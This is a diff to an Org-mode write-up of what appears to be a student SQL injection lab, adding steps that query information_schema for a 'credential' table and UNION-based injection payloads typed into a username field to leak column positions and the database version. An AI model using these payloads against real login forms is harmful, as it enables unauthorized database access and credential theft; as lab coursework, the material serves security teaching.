@@ -36,10 +36,24 @@
 
 
 * Task 2
+** Approach
+*** We can get the columns of a table using the following query
+      #+BEGIN_SRC sql
+        select column_name from information_schema.columns where table_name = "credential";
+      #+END_SRC
+*** After that we can use row_number over the partition and get the column numbers 
+      #+BEGIN_SRC sql
+        select ans.colnum from (select column_name, row_number() over(order by column_name) as colnum from information_schema.columns where table_name = "credential")ans where column_name = "Name";
+      #+END_SRC
+*** Now we can use this expression combined union attack to inject the code and we will get the column number of Name from 
+      Inject {{' OR FALSE UNION SELECT 1, (select ans.colnum from (select column_name, row_number() over(order by column_name) as colnum from information_schema.columns where table_name = "credential")ans where column_name = "Name"),null,null,null,null,null,null,null,null,null #}}
+
+** Screenshot
+[[./screenshots/assignment/task-2-name-column-number.png]]
 
 * Task 3
 ** Union Attack
-*** Insert {{' or FALSE union select 1,version(),null,null,null,null,null,null,null,null,null #}} in the username
+*** Insert {{' OR FALSE UNION SELECT 1,version(),null,null,null,null,null,null,null,null,null #}} in the username
     This works because we are essentially nullyfying the first SELECT using FALSE condition and
     then unioning the result of a select statement with equal number of resultants.
     In the manufactured select clause id cannot be null because the code assumes if id exists then user exists, so we put in dummy 1 as id
